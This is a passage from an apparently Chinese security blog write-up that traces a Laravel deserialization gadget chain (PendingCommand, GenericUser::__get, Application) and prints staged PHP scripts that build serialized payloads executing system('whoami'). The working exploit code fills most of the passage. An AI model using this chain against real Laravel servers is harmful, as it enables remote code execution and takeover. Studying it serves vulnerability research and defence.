class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" was asked.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           <span class="token keyword">throw</span> <span class="token variable">$e</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">expectedExitCode</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token operator">-&gt;</span><span class="token function">assertEquals</span><span class="token punctuation">(</span>               <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">expectedExitCode</span><span class="token punctuation">,</span> <span class="token variable">$exitCode</span><span class="token punctuation">,</span>               <span class="token string double-quoted-string">"Expected status code <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">expectedExitCode</span><span class="token punctuation">}</span></span> but received <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$exitCode</span><span class="token punctuation">}</span></span>."</span>           <span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> <span class="token variable">$exitCode</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注释上都直接写着命令执行，执行点为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$exitCode</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token punctuation">[</span><span class="token class-name static-context">Kernel</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">parameters</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所有的参数都是可控的</p><p>要进入到这一步要先绕过 <code>$this-&gt;mockConsoleOutput()</code> 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Mock the application's console output. * * @return void */</span><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">mockConsoleOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$mock</span> <span class="token operator">=</span> <span class="token class-name static-context">Mockery</span><span class="token operator">::</span><span class="token function">mock</span><span class="token punctuation">(</span><span class="token class-name static-context">OutputStyle</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token operator">.</span><span class="token string single-quoted-string">'[askQuestion]'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayInput</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">parameters</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">createABufferedOutputMock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token operator">-&gt;</span><span class="token property">expectedQuestions</span> <span class="token keyword">as</span> <span class="token variable">$i</span> <span class="token operator">=&gt;</span> <span class="token variable">$question</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$mock</span><span class="token operator">-&gt;</span><span class="token function">shouldReceive</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'askQuestion'</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">once</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">ordered</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">with</span><span class="token punctuation">(</span><span class="token class-name static-context">Mockery</span><span class="token operator">::</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$question</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token variable">$argument</span><span class="token operator">-&gt;</span><span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$question</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">andReturnUsing</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$question</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token operator">-&gt;</span><span class="token property">expectedQuestions</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token variable">$question</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token class-name static-context">OutputStyle</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$mock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$mock</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一部分使用 <code>ArrayInput()</code> 处理 <code>$this-&gt;parameters</code> ，所以要求 <code>$this-&gt;parameters</code> 为一个数组，随后调用 <code>$this-&gt;createABufferedOutputMock()</code> 方法。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Create a mock for the buffered output. * * @return \Mockery\MockInterface */</span><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">createABufferedOutputMock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$mock</span> <span class="token operator">=</span> <span class="token class-name static-context">Mockery</span><span class="token operator">::</span><span class="token function">mock</span><span class="token punctuation">(</span><span class="token class-name static-context">BufferedOutput</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token operator">.</span><span class="token string single-quoted-string">'[doWrite]'</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">shouldAllowMockingProtectedMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">shouldIgnoreMissing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token operator">-&gt;</span><span class="token property">expectedOutput</span> <span class="token keyword">as</span> <span class="token variable">$i</span> <span class="token operator">=&gt;</span> <span class="token variable">$output</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$mock</span><span class="token operator">-&gt;</span><span class="token function">shouldReceive</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'doWrite'</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">once</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">ordered</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">with</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span> <span class="token class-name static-context">Mockery</span><span class="token operator">::</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">-&gt;</span><span class="token function">andReturnUsing</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token operator">-&gt;</span><span class="token property">expectedOutput</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$mock</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化了一下 <code>$mock</code>，然后调用 <code>$this-&gt;test-&gt;expectedOutput</code>，但是该字段没有该属性，于是调用错误，这里可以寻找一个可利用的 <code>__get</code> 方法进行下一步利用</p><p><code>laravel\vendor\laravel\framework\src\Illuminate\Auth\GenericUser.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Dynamically access the user's attributes. * * @param  string  $key * @return mixed */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">attributes</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以控制任意内容</p><p>通过之后退出该函数重新进入到 <code>mockConsoleOutput()</code> 方法中</p><p>由于 <code>mockConsoleOutput()</code> 中也存在对 test 的调用所以也需要对其处理</p><p>这时阶段 payload  为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingCommand</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$hasExecuted</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hasExecuted</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">parameters</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GenericUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">GenericUser</span><span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">attributes</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expectedQuestions'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">attributes</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expectedOutput'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PendingCommand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打过去之后出现新的问题</p><p><img src="/../../../../pic/Pasted%20image%2020221116160346.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token class-name static-context">OutputStyle</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$mock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$mock</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>调用了 <code>$this-&gt;app</code> 但是没有进行初始化</p><p>查看该属性的描述</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * The application instance. * * @var \Illuminate\Foundation\Application */</span><span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到为一个 Application 类，不用关心函数具体做了什么，只要不报错就行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingCommand</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$hasExecuted</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hasExecuted</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">parameters</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GenericUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Application</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">GenericUser</span><span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">attributes</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expectedQuestions'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">attributes</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expectedOutput'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Application</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PendingCommand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打过去，又来一个问题</p><p><img src="/../../../../pic/Pasted%20image%2020221116160745.png"></p><p>进入了最终位置，需要调试一下看看具体干了什么</p><p>先是去调用了 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">offsetGet</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Resolve the given type from the container. * * @param  string  $abstract * @param  array  $parameters * @return mixed */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">make</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**     * Resolve the given type from the container.     *     * @param  string  $abstract     * @param  array  $parameters     * @return mixed     */</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">resolve</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$abstract</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getAlias</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$needsContextualBuild</span> <span class="token operator">=</span> <span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span> <span class="token function">is_null</span><span class="token punctuation">(</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getContextualConcrete</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// If an instance of the type is currently being managed as a singleton we'll</span>        <span class="token comment">// just return an existing instance instead of instantiating new instances</span>        <span class="token comment">// so the developer can keep using the same objects instance every time.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">instances</span><span class="token punctuation">[</span><span class="token variable">$abstract</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token variable">$needsContextualBuild</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">instances</span><span class="token punctuation">[</span><span class="token variable">$abstract</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">with</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token variable">$concrete</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getConcrete</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// We're ready to instantiate an instance of the concrete type registered for</span>        <span class="token comment">// the binding. This will instantiate the types, as well as resolve any of</span>        <span class="token comment">// its "nested" dependencies recursively until all have gotten resolved.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">isBuildable</span><span class="token punctuation">(</span><span class="token variable">$concrete</span><span class="token punctuation">,</span> <span class="token variable">$abstract</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token variable">$concrete</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token variable">$concrete</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// If we defined any extenders for this type, we'll need to spin through them</span>        <span class="token comment">// and apply them to the object being built. This allows for the extension</span>        <span class="token comment">// of services, such as changing configuration or decorating the object.</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getExtenders</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$extender</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token variable">$extender</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// If the requested type is registered as a singleton we'll want to cache off</span>        <span class="token comment">// the instances in "memory" so we can return it later without creating an</span>        <span class="token comment">// entirely new instance of an object on each subsequent request for it.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">isShared</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token variable">$needsContextualBuild</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">instances</span><span class="token punctuation">[</span><span class="token variable">$abstract</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$object</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">fireResolvingCallbacks</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span 